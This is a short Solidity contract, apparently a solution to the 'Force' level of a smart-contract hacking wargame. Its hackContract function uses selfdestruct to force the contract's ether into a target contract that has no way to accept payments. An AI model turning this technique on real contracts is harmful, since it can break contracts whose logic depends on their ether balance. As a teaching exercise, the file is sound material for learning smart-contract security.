// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Force.sol";

contract AttackingForce {
    address payable contractAddress;
    Force public forceContract; 

    constructor(address _contractAddress) payable {
        contractAddress = payable(_contractAddress); 
        forceContract = Force(contractAddress);
    }

    function hackContract() external {
        // Code me!
        selfdestruct(contractAddress);  
    }
}
